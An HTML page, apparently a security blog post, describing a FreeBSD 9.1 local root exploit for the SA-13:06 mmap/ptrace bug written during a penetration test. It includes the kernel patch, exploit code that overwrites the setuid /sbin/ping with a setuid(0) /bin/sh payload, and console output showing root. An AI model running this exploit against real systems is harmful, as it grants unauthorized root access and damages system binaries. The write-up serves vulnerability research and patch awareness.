@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>I feel lucky - or why I wrote a FreeBSD 1-day in one day</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2013/06/20/i-feel-lucky-or-why-i-wrote-a-freebsd-1-day-in-one-day.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="Sometimes life gives you eggs for free, you just need to spend some time making an omelet. That's exactly what happened to me on a...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="freebsd">
+    <meta name="tags" content="1day">
+    <meta name="tags" content="lpe">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="I feel lucky - or why I wrote a FreeBSD 1-day in one day"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="Sometimes life gives you eggs for free, you just need to spend some time making an omelet. That's exactly what happened to me on a..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2013/06/20/i-feel-lucky-or-why-i-wrote-a-freebsd-1-day-in-one-day.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2013-06-20 00:00:00+00:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2013-06-20 00:00:00+00:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="research"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="freebsd"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="1day"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="lpe"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="I feel lucky - or why I wrote a FreeBSD 1-day in one day">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2013/06/20/i-feel-lucky-or-why-i-wrote-a-freebsd-1-day-in-one-day.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+      <meta name="twitter:description" content="Sometimes life gives you eggs for free, you just need to spend some time making an omelet. That's exactly what happened to me on a...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "I feel lucky - or why I wrote a FreeBSD 1-day in one day",
+  "headline": "I feel lucky - or why I wrote a FreeBSD 1-day in one day",
+  "datePublished": "2013-06-20 00:00:00+00:00",
+  "dateModified": "2013-06-20 00:00:00+00:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/blog-cover.png",
+  "url": "https://blahcat.github.io/posts/2013/06/20/i-feel-lucky-or-why-i-wrote-a-freebsd-1-day-in-one-day.html",
+  "description": "Sometimes life gives you eggs for free, you just need to spend some time making an omelet. That's exactly what happened to me on a..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">I feel lucky - or why I wrote a FreeBSD 1-day in one day</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">20 Jun 2013</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/blog-cover.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <p>Sometimes life gives you eggs for free, you just need to spend some time making an omelet. That's exactly what happened to me on a recent engagement for a client: a typical PHP webapp full of holes left me with a nice stable shell access.</p>
+<p>But at that point I was stuck: I had a limited account (<code>www</code>) on this FreeBSD 9.1 (almost) up-to-date box, and interestingly  the privilege separation was done correctly enough to prevent me from getting <code>root</code> access simply by abusing the usual suspects (weak FS permission, setuid bins, privileged scripts and the likes).</p>
+<p>So it was with little hope I decided to take a look at the <a href="https://www.freebsd.org/security/advisories/">recent advisories for FreeBSD</a> which I really like because they are well maintained. One title struck my eye immediately: <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc">SA-13:06.mmap - Privilege escalation via <code>mmap</code></a>, published the day right before!</p>
+<p>I decided to look into it at first with not much hope, thinking the exploit would be crazy hard to trigger and heavily deep inside FreeBSD kernel. The description was actually (on purpose?) quite generic</p>
+<blockquote>
+<p>Due to insufficient permission checks in the virtual memory system, a tracing process (such as a debugger) may be able to modify portions of the traced process's address space to which the traced process itself does not have write access.</p>
+</blockquote>
+<p>But the <a href="http://security.FreeBSD.org/patches/SA-13:06/mmap.patch">patch</a> gave me a better idea of the issue:</p>
+<div class="highlight"><pre><span></span><code><span class="gh">Index: sys/vm/vm_map.c</span>
+<span class="gh">===================================================================</span>
+<span class="gd">--- sys/vm/vm_map.c (revision 251636)</span>
+<span class="gi">+++ sys/vm/vm_map.c (working copy)</span>
+<span class="gu">@@ -3761,6 +3761,12 @@ RetryLookup:;</span>
+<span class="w"> </span>        vm_map_unlock_read(map);
+<span class="w"> </span>        return (KERN_PROTECTION_FAILURE);
+<span class="w"> </span>    }
+<span class="gi">+   if ((fault_typea &amp; VM_PROT_COPY) != 0 &amp;&amp;</span>
+<span class="gi">+       (entry-&gt;max_protection &amp; VM_PROT_WRITE) == 0 &amp;&amp;</span>
+<span class="gi">+       (entry-&gt;eflags &amp; MAP_ENTRY_COW) == 0) {</span>
+<span class="gi">+       vm_map_unlock_read(map);</span>
+<span class="gi">+       return (KERN_PROTECTION_FAILURE);</span>
+<span class="gi">+   }</span>
+
+<span class="w"> </span>    /*
+<span class="w"> </span>     * If this page is not pageable, we have to get it for all possible
+</code></pre></div>
+
+<p>It kindda gave a good pointer of where to start: the usual rule for setuid dictates that a write access should immediately imply losing the elevated privilege. But this is where the bug was: by <code>mmap</code> a setuid binary (which any user can do), I can then choose to <code>ptrace</code> the process, and use <code>PT_WRITE</code> command to overwrite the <code>mmap</code>-ed memory, effectively overwriting the setuid binary!</p>
+<div class="alert-info"><i class="fa fa-info-circle">&nbsp;Note:</i> I was in a rush, so my exploit is partially destructive as I overwrite directly the setuid binary. If you choose to use it, please make a copy to be able to restore it.</div>
+<p>My exploit was in 4 parts:</p>
+<ol>
+<li>
+<p><code>mmap</code> the target binary (here I chose <code>/sbin/ping</code>)</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/sbin/ping&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+<span class="n">caddr_t</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">LEN</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_READ</span><span class="p">,</span><span class="w"> </span><span class="n">MAP_SHARED</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+</code></pre></div>
+
+</li>
+<li>
+<p><code>fork</code> to passe to be the <code>mmap</code>-ed address to a process I can attach to using <code>ptrace()</code></p>
+</li>
+<li>
+<p>in the parent process, I attach to the child process and then prepare a basic payload to substitute the original code with</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_ATTACH</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;[-] ptrace(PT_ATTACH) failed&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">[...]</span>
+<span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;./sc.c&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">,</span><span class="w">  </span><span class="n">S_IRUSR</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">S_IWUSR</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">S_IRGRP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">S_IWGRP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">S_IROTH</span><span class="p">);</span>
+<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span>
+<span class="w">    </span><span class="s">&quot;#include &lt;stdio.h&gt;</span><span class="se">\n</span><span class="s">&quot;</span>\
+<span class="w">    </span><span class="s">&quot;main(){ &quot;</span>\
+<span class="w">    </span><span class="s">&quot;char* s[]={</span><span class="se">\&quot;</span><span class="s">/bin/sh</span><span class="se">\&quot;</span><span class="s">,NULL};&quot;</span>\
+<span class="w">    </span><span class="s">&quot;setuid(0);execve(s[0],s,0); }</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="mi">84</span><span class="p">);</span>
+<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">&quot;gcc -o ./sc ./sc.c&quot;</span><span class="p">);</span>
+</code></pre></div>
+
+</li>
+<li>
+<p>all done, we could now copy our payload 1 DWORD at a time using <code>ptrace(PT_WRITE_D)</code></p>
+<div class="highlight"><pre><span></span><code><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;./sc&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+<span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ptrace</span><span class="p">(</span><span class="n">PT_WRITE_D</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="n">mmap_setuid_address</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">);</span>
+<span class="w">    </span><span class="n">i</span><span class="o">+=</span><span class="n">n</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+</li>
+</ol>
+<p>Done! Simply execute the target binary to get a root shell.</p>
+<div class="highlight"><pre><span></span><code><span class="w"> </span>$<span class="w"> </span>id
+<span class="w"> </span><span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span>
+<span class="w"> </span>$<span class="w"> </span>gcc<span class="w"> </span>-Wall<span class="w"> </span>./mmap.c<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./a.out
+<span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>old<span class="w"> </span><span class="s1">&#39;/sbin/ping&#39;</span>
+<span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>mmap-ed<span class="w"> </span>area<span class="w"> </span>at<span class="w"> </span>0x281a4000
+<span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Attached<span class="w"> </span>to<span class="w"> </span><span class="m">3404</span>
+<span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Copied<span class="w"> </span><span class="m">4917</span><span class="w"> </span>bytes<span class="w"> </span>of<span class="w"> </span>payload<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;/sbin/ping&#39;</span>
+<span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Triggering<span class="w"> </span>payload
+<span class="w"> </span>$<span class="w"> </span>id
+<span class="w"> </span><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>wheel<span class="o">)</span><span class="w"> </span><span class="nv">egid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
+</code></pre></div>
+
+<p>By nature, this exploit is very stable and I was able to report that I had <code>root</code> access to my customer :)
+I was undeniably lucky to find exactly the privilege escalation I need just exactly when I needed it (kudos to Konstantin Belousov &amp; Alan Cox for the finding), but it also taught me that there can be a huge difference of postponing applying patches, even if for one day...</p>
+<p>Cheers mates!</p>
+<p>PS: for the full <a href="https://gist.github.com/hugsy/5933831">quick'n dirty exploit</a></p>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=I feel lucky - or why I wrote a FreeBSD 1-day in one day&amp;url=https://blahcat.github.io/posts/2013/06/20/i-feel-lucky-or-why-i-wrote-a-freebsd-1-day-in-one-day.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2013/06/20/i-feel-lucky-or-why-i-wrote-a-freebsd-1-day-in-one-day.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2013/06/20/i-feel-lucky-or-why-i-wrote-a-freebsd-1-day-in-one-day.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/freebsd">freebsd</a><a href="https://blahcat.github.io/tag/1day">1day</a><a href="https://blahcat.github.io/tag/lpe">lpe</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/research">research</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=I feel lucky - or why I wrote a FreeBSD 1-day in one day">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2013/12/23/using-new-syscalls-for-readwrite-arbitrary-memory-on-linux.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">Using new syscalls for read/write arbitrary memory on Linux.</h2>
+                            <p class="post-nav-excerpt">Even though well known methods exist to bypass ptrace deactivation on a process when...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
